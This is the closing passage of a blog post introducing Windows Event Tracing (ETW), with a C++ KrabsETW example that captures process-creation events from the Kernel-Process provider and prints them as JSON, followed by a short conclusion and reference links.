class="meta">#<span class="keyword">include</span> <span class="string">&lt;nlohmann/json.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Callback function when session receives an event from provider</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">callback</span><span class="params">(<span class="type">const</span> EVENT_RECORD&amp; record, <span class="type">const</span> krabs::trace_context&amp; trace_context)</span> </span>&#123;</span><br><span class="line">    <span class="function">krabs::schema <span class="title">schema</span><span class="params">(record, trace_context.schema_locator)</span></span>;</span><br><span class="line">    <span class="function">krabs::parser <span class="title">parser</span><span class="params">(schema)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (schema.<span class="built_in">event_id</span>() == <span class="number">1</span>) &#123;</span><br><span class="line">        nlohmann::json data;</span><br><span class="line">        data[<span class="string">&quot;ProcessID&quot;</span>] = parser.<span class="built_in">parse</span>&lt;<span class="type">uint32_t</span>&gt;(<span class="string">L&quot;ProcessID&quot;</span>);</span><br><span class="line">        data[<span class="string">&quot;CreateTime&quot;</span>] = parser.<span class="built_in">parse</span>&lt;<span class="type">uint64_t</span>&gt;(<span class="string">L&quot;CreateTime&quot;</span>);</span><br><span class="line">        data[<span class="string">&quot;ParentProcessID&quot;</span>] = parser.<span class="built_in">parse</span>&lt;<span class="type">uint32_t</span>&gt;(<span class="string">L&quot;ParentProcessID&quot;</span>);</span><br><span class="line">        data[<span class="string">&quot;SessionID&quot;</span>] = parser.<span class="built_in">parse</span>&lt;<span class="type">uint32_t</span>&gt;(<span class="string">L&quot;SessionID&quot;</span>);</span><br><span class="line">        data[<span class="string">&quot;ImageName&quot;</span>] = parser.<span class="built_in">parse</span>&lt;std::wstring&gt;(<span class="string">L&quot;ImageName&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        std::wcout &lt;&lt; data.<span class="built_in">dump</span>(<span class="number">4</span>) &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Create an ETW session</span></span><br><span class="line">    <span class="function">krabs::user_trace <span class="title">trace</span><span class="params">(<span class="string">L&quot;ProcessTrace&quot;</span>)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Set provider</span></span><br><span class="line">    krabs::provider&lt;&gt; <span class="built_in">provider</span>(<span class="string">L&quot;Microsoft-Windows-Kernel-Process&quot;</span>);</span><br><span class="line">    provider.<span class="built_in">any</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Add event callback function</span></span><br><span class="line">    provider.<span class="built_in">add_on_event_callback</span>(callback);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Enable provider and start session</span></span><br><span class="line">    trace.<span class="built_in">enable</span>(provider);</span><br><span class="line">    trace.<span class="built_in">start</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The above code demonstrates how to create an ETW session and capture and analyze events in real-time. This is very helpful for those who need to understand system operations and perform security analysis in-depth.</p>
<h2 id="conclusion">Conclusion</h2>
<p>ETW is a powerful event tracing mechanism on the Windows platform, valuable for both Blue and Red Teams. By understanding its operating mechanism and usage methods, we can better utilize ETW for system monitoring and security analysis. I hope this article helps you quickly get started with ETW and become an expert in this field in the future.</p>
<h2 id="reference">Reference</h2>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-hardware/test/weg/instrumenting-your-code-with-etw">https://learn.microsoft.com/en-us/windows-hardware/test/weg/instrumenting-your-code-with-etw</a></p></li>
<li><p><a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10279093">https://ithelp.ithome.com.tw/articles/10279093</a></p></li>
<li><p><a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10279511">https://ithelp.ithome.com.tw/articles/10279511</a></p></li>
<li><p><a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10279920">https://ithelp.ithome.com.tw/articles/10279920</a></p></li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://sharkkcode.github.io">Sharkkcode</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://sharkkcode.github.io/2024/07/07/Detailed-Guide-to-Getting-Started-with-Windows-ETW/">https://sharkkcode.github.io/2024/07/07/Detailed-Guide-to-Getting-Started-with-Windows-ETW/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Windows/">Windows</a><a class="post-meta__tags" href="/tags/ETW/">ETW</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/08/31/CVE-2024-6239/"><img class="prev-cover" src="/img/wall.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">CVE-2024-6239</div></div></a></div><div class="next-post pull-right"><a href="/2024/07/06/Understanding-Yara-Sigma-and-Snort-Rules-in-Cybersecurity/"><img class="next-cover" src="/img/wall.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Understanding Yara, Sigma, and Snort Rules in Cybersecurity</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/fishingcat.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Sharkkcode</div><div class="author-info__description">Keep Learning</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">40</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Sharkkcode"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my BLOG ~~~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#detailed-guide-to-getting-started-with-windows-etw"><span class="toc-number">1.</span> <span class="toc-text">Detailed Guide to Getting Started with Windows ETW</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#environment"><span class="toc-number">1.1.</span> <span class="toc-text">Environment</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#introduction-to-etw"><span class="toc-number">1.2.</span> <span class="toc-text">Introduction to ETW</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#history"><span class="toc-number">1.2.1.</span> <span class="toc-text">History</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#operating-mechanism"><span class="toc-number">1.2.2.</span> <span class="toc-text">Operating Mechanism</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#practical-uses"><span class="toc-number">1.2.3.</span> <span class="toc-text">Practical Uses</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#etw-tools"><span class="toc-number">1.3.</span> <span class="toc-text">ETW Tools</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#introduction"><span class="toc-number">1.3.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#usage"><span class="toc-number">1.3.2.</span> <span class="toc-text">Usage</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#example-of-capturing-and-analyzing-events-using-krabsetw-and-json-libraries"><span class="toc-number">1.4.</span> <span class="toc-text">Example of Capturing and Analyzing Events Using KrabsETW and JSON Libraries</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#example-of-implementing-detection-bypass"><span class="toc-number">1.5.</span> <span class="toc-text">Example of Implementing Detection Bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#advanced-use-real-time-event-capture-and-analysis"><span class="toc-number">1.6.</span> <span class="toc-text">Advanced Use: Real-time Event Capture and Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#conclusion"><span class="toc-number">1.7.</span> <span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reference"><span class="toc-number">1.8.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/09/05/Web-Security-Academy-SQL-injection-Writeups/" title="Web Security Academy SQL injection Writeups"><img src="/img/wall.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Web Security Academy SQL injection Writeups"/></a><div class="content"><a class="title" href="/2024/09/05/Web-Security-Academy-SQL-injection-Writeups/" title="Web Security Academy SQL injection Writeups">Web Security Academy SQL injection Writeups</a><time datetime="2024-09-05T14:15:41.000Z" title="Created 2024-09-05 22:15:41">2024-09-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/31/CVE-2024-6239/" title="CVE-2024-6239"><img src="/img/wall.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2024-6239"/></a><div class="content"><a class="title" href="/2024/08/31/CVE-2024-6239/" title="CVE-2024-6239">CVE-2024-6239</a><time datetime="2024-08-30T16:07:12.000Z" title="Created 2024-08-31 00:07:12">2024-08-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/07/Detailed-Guide-to-Getting-Started-with-Windows-ETW/" title="Detailed Guide to Getting Started with Windows ETW"><img src="/img/wall.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Detailed Guide to Getting Started with Windows ETW"/></a><div class="content"><a class="title" href="/2024/07/07/Detailed-Guide-to-Getting-Started-with-Windows-ETW/" title="Detailed Guide to Getting Started with Windows ETW">Detailed Guide to Getting Started with Windows ETW</a><time datetime="2024-07-07T09:27:28.000Z" title="Created 2024-07-07 17:27:28">2024-07-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/06/Understanding-Yara-Sigma-and-Snort-Rules-in-Cybersecurity/" title="Understanding Yara, Sigma, and Snort Rules in Cybersecurity"><img src="/img/wall.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Understanding Yara, Sigma, and Snort Rules in Cybersecurity"/></a><div class="content"><a class="title" href="/2024/07/06/Understanding-Yara-Sigma-and-Snort-Rules-in-Cybersecurity/" title="Understanding Yara, Sigma, and Snort Rules in Cybersecurity">Understanding Yara, Sigma, and Snort Rules in Cybersecurity</a><time datetime="2024-07-06T12:59:38.000Z" title="Created 2024-07-06 20:59:38">2024-07-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/25/OSINT-Exercise-001-walkthrough/" title="OSINT Exercise 001 walkthrough"><img src="/img/wall.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="OSINT Exercise 001 walkthrough"/></a><div class="content"><a class="title" href="/2024/06/25/OSINT-Exercise-001-walkthrough/" title="OSINT Exercise 001 walkthrough">OSINT Exercise 001 walkthrough</a><time datetime="2024-06-25T09:26:20.000Z" title="Created 2024-06-25 17:26:20">2024-06-25</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Sharkkcode</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    chtml: {
      scale: 1.2
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        insertScript: [200, () => {
          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
            const target = node.parentNode
            if (target.nodeName.toLowerCase() === 'li') {
              target.parentNode.classList.add('has-jax')
            } else {
              target.classList.add('has-jax')
            }
          });
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>